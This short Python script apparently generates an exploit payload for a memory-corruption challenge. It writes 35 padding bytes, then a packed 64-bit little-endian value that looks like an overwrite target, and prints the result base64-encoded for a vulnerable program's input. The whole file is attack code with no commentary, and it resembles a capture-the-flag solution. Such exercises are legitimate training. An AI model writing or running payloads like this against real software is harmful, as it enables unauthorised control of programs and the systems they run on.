
import sys
import struct
import base64

buf = b'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ'
buf += struct.pack('<Q', 3781561131354377211)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
